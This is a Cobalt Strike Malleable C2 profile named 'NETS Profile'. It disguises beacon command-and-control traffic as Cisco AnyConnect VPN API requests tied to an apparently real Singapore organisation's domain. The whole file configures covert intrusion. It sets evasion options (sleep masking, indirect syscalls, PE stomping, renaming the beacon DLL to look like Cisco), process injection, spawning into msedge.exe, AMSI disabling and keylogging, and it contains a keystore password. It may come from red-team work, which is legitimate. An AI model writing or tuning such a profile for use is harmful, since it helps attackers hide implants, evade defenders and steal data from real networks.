# https://github.com/Cobalt-Strike/Malleable-C2-Profiles/blob/master/normal/reference.profile#L165

set sample_name "NETS Profile";

set sleeptime "60000"; 
set data_jitter "50";
set jitter "9";

set tasks_max_size "2097152";   # The maximum size (in bytes) of task(s) and proxy data that can be transferred through a communication channel at a check in
set pipename "msagent_###";     # Default name of pipe to use for SMB Beacon's peer-to-peer communication. Each # is replaced with a random hex value
set pipename_stager "status_##";

set host_stage "false";

set smb_frame_header "";
set ssh_banner "Cisco AnyConnect";

set ssh_pipename "SearchTextHarvester##";
set tcp_frame_header "";
set tcp_port "4444";

dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".stage.123456.";
    set dns_ttl "1";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive""timeout=5, max=100";
    header "Connection""Keep-Alive";

# The set trust_x_forwarded_foroption decides if Cobalt Strike uses the 
# X-Forwarded-For set header to determine the remote address of a request. 
# Use this option if your Cobalt Strike server is behind an set redirector    
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

https-certificate {
    set C "SG";             # Country
    set CN "localhost";     # CN - you will probably nver use this, but don't leave at localost
    set L "Singapore";      # Locality
    set OU "IT Security";   # Org unit
    set O "NETS Group";     # Org name
    set ST "SG";            # State
    set validity "365";

    # if using a valid vert, specify this, keystore = java keystore
    set keystore "localhost.store";
    set password "Privas3c!c00lcatz";
}

#code-signer {
#    set keystore "keystore.jks";
#    set password "password";
#    set alias    "server";
#    set timestamp "false";
#    set timestamp_url "set://timestamp.digicert.com";
#}

# Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
http-stager {
    set uri_x86 "/api/v1/VPNConnection";     
    set uri_x64 "/api/v2/VPNConnection";
    client {
        parameter "uuid" "96c5f1e1-067b-492e-a38b-4f6290369121";
        #header "headername" "headervalue";
    }
    server {
        header "Content-Type" "application/octet-stream";    
        header "Content-Encoding" "gzip";    
        output {        
            #GZIP headers and footers
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
            #AFAICT print is the only supported terminator
            print;
        }
    }
}

http-stager "HTTP" {
    set uri_x86 "/api/v1/SSLConnection";     
    set uri_x64 "/api/v2/SSLConnection";
    client {
        parameter "uuid" "96c5f1e1-067b-492e-a38b-4f6290369121";
        #header "headername" "headervalue";
    }
    server {
        header "Content-Type" "application/octet-stream";    
        header "Content-Encoding" "gzip";    
        output {        
            #GZIP headers and footers
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
            #AFAICT print is the only supported terminator
            print;
        }
    }
}

# This is used only in http-get and http-post and not during stage
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

# define indicators for an set GET
http-get {
	# we require a stub URI to attach the rest of our data to.
	set uri "/api/v1/Updates";

	client {
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
		# mask our metadata, base64 encode it, store it in the URI
		metadata {

            # XOR encode the value
			mask;
            
            # URL-safe Base64 Encode
			#base64url;

            # URL-safe Base64 Encode
			base64;

            # NetBIOS Encode ‘a’ ?
            #netbios;

            #NetBIOS Encode ‘A’
            #netbiosu;

            # You probably want these to be last two, else you will encode these values

            # Append a string to metadata
            append ";" ;

            # Prepend a string
            prepend "SESSION=";
            # Terminator statements - these say where the metadata goes
            # Pick one

            # Append to URI
            # uri-append;
            
            #Set in a header
            header "Cookie";

            #Send data as transaction body
            #print

            #Store data in a URI parameter
            #parameter "someparam"
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";
		# prepend some text in case the GET is empty.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}

http-get "HTTP" {
	# we require a stub URI to attach the rest of our data to.
	set uri "/api/v1/Upgrades";

	client {
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
		# mask our metadata, base64 encode it, store it in the URI
		metadata {

            # XOR encode the value
			mask;
            
            # URL-safe Base64 Encode
			#base64url;

            # URL-safe Base64 Encode
			base64;

            # NetBIOS Encode ‘a’ ?
            #netbios;

            #NetBIOS Encode ‘A’
            #netbiosu;

            # You probably want these to be last two, else you will encode these values

            # Append a string to metadata
            append ";" ;

            # Prepend a string
            prepend "SESSION=";
            # Terminator statements - these say where the metadata goes
            # Pick one

            # Append to URI
            # uri-append;
            
            #Set in a header
            header "Cookie";

            #Send data as transaction body
            #print

            #Store data in a URI parameter
            #parameter "someparam"
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";
		# prepend some text in case the GET is empty.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}

# define indicators for an set POST
http-post {
	set uri "/api/v1/Telemetry/Id/";
	set verb "POST";

	client {
		# make it look like we're posting something cool.
		header "Content-Type" "application/json";
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";

		output {
			mask;
			base64url;
			uri-append;
		}

		# randomize and post our session ID
		id {
			mask;
			base64url;
			prepend "{version: 1, d=\x22";            
			append "\x22}\n";
			print;
		}
	}

	# The server's response to our set POST
	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";

		# POST usually sends nothing, so let's prepend a string, mask it, and
		# base64 encode it. We'll get something different back each time.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}

http-post "HTTP" {
	set uri "/api/v1/Log/Id/";
	set verb "POST";

	client {
		# make it look like we're posting something cool.
		header "Content-Type" "application/json";
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";

		output {
			mask;
			base64url;
			uri-append;
		}

		# randomize and post our session ID
		id {
			mask;
			base64url;
			prepend "{version: 1, d=\x22";            
			append "\x22}\n";
			print;
		}
	}

	# The server's response to our set POST
	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";

		# POST usually sends nothing, so let's prepend a string, mask it, and
		# base64 encode it. We'll get something different back each time.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}

stage {
# The transform-x86 and transform-x64 blocks pad and transform Beacon's
# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 {
        prepend "\x90\x90";
        strrep "ReflectiveLoader" "AnyConnect";
        strrep "beacon.dll" "cisco.dll";
    }
    
    transform-x64 {
        prepend "\x90\x90";
        strrep "ReflectiveLoader" "AnyConnect";
        strrep "beacon.dll" "cisco.dll";
    }

    stringw "vpn.nets.com.sg";

    set allocator "MapViewOfFile";  # HeapAlloc,MapViewOfFile, and VirtualAlloc. 
    set cleanup "true";             # Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it
    
    # Override the first bytes (MZ header included) of Beacon's Reflective DLL. 
    # Valid x86 instructions are required. Follow instructions that change
    # CPU state with instructions that undo the change.
    
    # set magic_mz_x86 "MZRE";
    # set magic_mz_x86 "MZAR";

    set magic_pe "PE";  #Override PE marker with something else

    # Ask the x86 ReflectiveLoader to load the specified library and overwrite
    # its space instead of allocating memory with VirtualAlloc.
    # Only works with VirtualAlloc
    #set module_x86 "xpsservices.dll";
    #set module_x64 "xpsservices.dll";

    # Obfuscate the Reflective DLL's import table, overwrite unused header content, 
    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
    set obfuscate "false"; 

    # Obfuscate Beacon, in-memory, prior to sleeping
    set sleep_mask "true";

    # Supports: None, Direct, and Indirect. Superseded by beacon_gate
    set syscall_method "indirect";

    # beacon_gate may be set to:
    # ALL (Comms + Core + Cleanup)
    # COMMS (InternetOpenA and InternetConnectA)
    # CORE (Windows API equivalents (i.e., VirtualAlloc) of Beacon's existing system call API)
    # CLEANUP proxying ExitThread via the Sleepmask
    # or specific supported APIs as shown below
    # beacon_gate ignored when sleep_mask is set to false
    #beacon_gate {
    #  VirtualAlloc;
    #  VirtualAllocEx;
    #  InternetConnectA;
    #}

    beacon_gate {
      Comms;
      Cleanup;
      VirtualAlloc;
      VirtualAllocEx;
    }

    # Use embedded function pointer hints to bootstrap Beacon agent without 
    # walking kernel32 EAT
    set smartinject "true";

    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after 
    # it loads Beacon payload
    set stomppe "true";

    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
    set userwx "false";

    # PE header cloning - see "petool", skipped for now
    set compile_time "14 Sep 2018 08:14:00";
    # set image_size_x86 "512000";
    # set image_size_x64 "512000";
    set entry_point "92145";

    #The Exported name of the Beacon DLL
    #set name "WWanMM.dll" 
    
    # set rich_header  # Using a valid rich header from a different executable is recommended
}

process-inject {
        # Set how memory is allocated in a remote process
        # VirtualAllocEx or NtMapViewOfSection. The
        # NtMapViewOfSection option is for same-architecture injection only. 
        # VirtualAllocEx is always used for cross-arch memory allocations.

        set allocator "NtMapViewOfSection";     # Shape the memory characteristics and content
        set min_alloc "16384";
        set startrwx "false";
        set userwx "false";
        set bof_reuse_memory "false";

        transform-x86 {
            prepend "\x90\x90";
        }

        transform-x64 {
            prepend "\x90\x90";
        }

        execute {                              # Determine how to execute the injected code
            CreateThread "ntdll.dll!RtlUserThreadStart";
            SetThreadContext;
            CreateRemoteThread;
            RtlCreateUserThread;
        }
}

post-ex {
    # control the temporary process we spawn to
    set spawnto_x86 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"; 

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # change our post-ex output named pipe names...
    set pipename "msrpc_####, win\\msrpc_##";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

    # The thread_hint option allows multi-threaded post-ex DLLs to spawn 
    # threads with a spoofed start address. Specify the thread hint as 
    # “module!function+0x##” to specify the start address to spoof. 
    # The optional 0x## part is an offset added to the start address.
    # set thread_hint "....TODO:FIXME"

    # options are: GetAsyncKeyState (def) or SetWindowsHookEx
    set keylogger "GetAsyncKeyState";
}